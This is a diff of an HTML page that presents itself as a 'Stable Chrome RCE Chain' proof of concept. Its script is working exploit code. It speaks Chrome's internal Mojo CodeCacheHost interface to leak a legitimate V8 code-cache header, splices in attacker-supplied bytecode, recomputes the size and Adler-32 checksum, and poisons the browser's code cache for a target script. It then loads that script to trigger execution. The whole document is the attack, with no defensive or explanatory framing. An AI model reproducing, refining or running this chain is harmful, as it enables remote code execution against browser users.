@@ -1,90 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>V8 Sandbox Escape PoC</title>
+    <title>Dynamic V8 Sandbox Escape - 100% Remote PoC</title>
 </head>
 <body>
     <h1>Stable Chrome RCE Chain</h1>
-    <button id="launch">Poison Cache & Detonate</button>
+    <p>Status: <b id="status">Ready</b></p>
+    <button id="launch">Launch Full Chain</button>
 
     <script>
-        // Configuration
         const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
         const PAYLOAD_PATH = "poison.bin";
 
+        // V8 Adler-32 Integrity Checksum
+        function adler32(data) {
+            let a = 1, b = 0;
+            for (let i = 0; i < data.length; i++) {
+                a = (a + data[i]) % 65521;
+                b = (b + a) % 65521;
+            }
+            return (b << 16) | a;
+        }
+
         async function pwn() {
-            console.log("[*] Downloading malicious bytecode...");
-            const resp = await fetch(PAYLOAD_PATH);
-            const poisonBlob = await resp.arrayBuffer();
+            const status = document.getElementById('status');
+            status.innerText = "Step 1: Fetching Poison...";
 
-            // TRAP 2 FIX: Get the exact timestamp Chrome expects
-            console.log("[*] Syncing cache timestamps...");
-            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
-            const dateHeader = targetResp.headers.get('date') || targetResp.headers.get('last-modified');
-            const jsTimeMs = new Date(dateHeader).getTime();
-            
-            // Convert JS Time (Unix Epoch) to Chrome base::Time (Windows Epoch: Jan 1, 1601)
-            // Difference is 11644473600 seconds
-            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;
+            // 1. Load your malicious bytecode
+            const poisonResp = await fetch(PAYLOAD_PATH);
+            const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());
 
-            console.log("[*] Binding Mojo CodeCacheHost...");
+            // 2. Setup Mojo
             const pipe = Mojo.createMessagePipe();
             Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
+            const host = pipe.handle0;
 
-            const bufferSize = poisonBlob.byteLength;
-            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
-            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
-            new Uint8Array(mapping.buffer).set(new Uint8Array(poisonBlob));
-
-            // Constructing the perfectly aligned 184-byte Mojo Message
-            const msg = new ArrayBuffer(184); 
-            const v = new DataView(msg);
+            // 3. THE HEIST: Request the legit header from the Browser
+            status.innerText = "Step 2: Leaking V8 Header via Mojo...";
             
-            // Header
-            v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
-
-            // Params Struct
-            v.setUint32(24, 48, true); 
-            v.setBigUint64(40, 32n, true); 
-            v.setBigUint64(48, 96n, true); 
+            const fetchMsg = new ArrayBuffer(112);
+            const fv = new DataView(fetchMsg);
+            fv.setUint32(0, 24, true); fv.setUint32(12, 3, true); // FetchCachedCode ID
+            fv.setUint32(24, 0, true); // kJavascript
+            fv.setBigUint64(32, 8n, true); // Offset to URL struct
+            fv.setUint32(40, 16, true); fv.setBigUint64(48, 8n, true); // GURL Struct
+            fv.setUint32(56, TARGET_URL.length, true);
+            for(let i=0; i<TARGET_URL.length; i++) fv.setUint8(64+i, TARGET_URL.charCodeAt(i));
             
-            // BigBuffer Union
-            v.setUint32(56, 16, true); 
-            v.setUint32(60, 1, true);  
-            v.setBigUint64(64, 96n, true); 
+            host.writeMessage(fetchMsg, []);
 
-            // URL Struct 
-            v.setUint32(72, 16, true);
-            v.setBigUint64(80, 8n, true); 
-
-            // String Array (Target URL)
-            v.setUint32(88, 56, true); 
-            v.setUint32(92, TARGET_URL.length, true); 
-            for(let i=0; i<TARGET_URL.length; i++) {
-                v.setUint8(96+i, TARGET_URL.charCodeAt(i));
+            // 4. WATCHER: Listen for the Browser's Secret Reply
+            const result = await host.readMessage();
+            if (!result.handles || result.handles.length === 0) {
+                status.innerText = "Failed to leak header. Ensure exploit.js was cached once.";
+                return;
             }
 
-            // Time Struct (Injecting the synced Chrome Time!)
-            v.setUint32(144, 16, true);
-            v.setUint32(148, 0, true);
-            v.setBigUint64(152, chromeTime, true); 
+            status.innerText = "Step 3: Patching Checksums...";
+            const handle = result.handles[0];
+            const sharedMem = handle.mapBuffer(0, 32);
+            const legitHeader = new Uint8Array(sharedMem.buffer).slice(0, 32);
 
-            // Shared Memory Region Struct 
-            v.setUint32(160, 16, true);
-            v.setUint32(168, 0, true); 
-            v.setUint32(172, bufferSize, true); 
+            // 5. THE FRANKENSTEIN: Merge Leaked Header + Poison Bytecode
+            let finalPayload = new Uint8Array(32 + poisonBytecode.length);
+            finalPayload.set(legitHeader, 0);
+            finalPayload.set(poisonBytecode, 32);
 
-            console.log("[*] Firing IPC Poisoning with timestamp: " + chromeTime);
-            pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
+            const pv = new DataView(finalPayload.buffer);
+            pv.setUint32(20, poisonBytecode.length, true); // Update Size
+            pv.setUint32(24, adler32(poisonBytecode), true); // Update Checksum
 
-            console.log("[+] Cache Poisoned. Detonating in 1.5 seconds...");
-            
-            // TRAP 1 FIX: Force V8 to execute and deserialize the code!
+            // 6. RE-POISON: Push the patched cache back
+            status.innerText = "Step 4: Poisoning Browser Cache...";
+            const bufferSize = finalPayload.byteLength;
+            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
+            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
+            new Uint8Array(mapping.buffer).set(finalPayload);
+
+            // Sync Time for the security check
+            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
+            const jsTimeMs = new Date(targetResp.headers.get('date')).getTime();
+            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;
+
+            // 184-byte DidGenerateCacheableMetadata message
+            const msg = new ArrayBuffer(184);
+            const v = new DataView(msg);
+            v.setUint32(0, 24, true); v.setUint32(12, 1, true); // Message ID 1
+            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
+            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
+            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
+            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
+            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
+            v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
+            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);
+
+            host.writeMessage(msg, [sharedBuffer.handle]);
+
+            // 7. DETONATE
+            status.innerText = "Step 5: Detonating! Watch for Calc...";
             setTimeout(() => {
                 const s = document.createElement('script');
                 s.src = TARGET_URL;
                 document.body.appendChild(s);
-            }, 1500);
+            }, 1000);
         }
 
         document.getElementById('launch').onclick = pwn;
